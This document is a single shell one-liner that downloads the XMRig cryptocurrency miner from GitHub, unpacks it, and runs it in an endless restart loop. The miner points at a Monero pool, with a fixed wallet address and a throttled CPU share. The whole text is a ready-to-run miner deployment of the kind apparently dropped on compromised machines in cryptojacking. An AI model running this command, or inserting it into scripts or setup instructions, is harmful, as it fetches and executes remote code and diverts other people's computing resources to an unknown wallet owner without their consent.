wget https://github.com/xmrig/xmrig/releases/download/v2.11.0/xmrig-2.11.0-xenial-x64.tar.gz && tar -xf xmrig-2.11.0-xenial-x64.tar.gz && cd xmrig-2.11.0 && while true; do ./xmrig -o stratum+tcp://pool.supportxmr.com:5555 -u 45UVbdyweuJV5peeuD1ypVbFs6Z1nYhRB4r9BEL9xYjE8Ej8Pjob3LQX2dN4m314gB87Z1M9TbabwN4g4L9184dcCLyiU6y -p Nvidia7 --threads 4 --max-cpu-usage=70 --cpu-priority 3 --donate-level 1 ; sleep 1; done
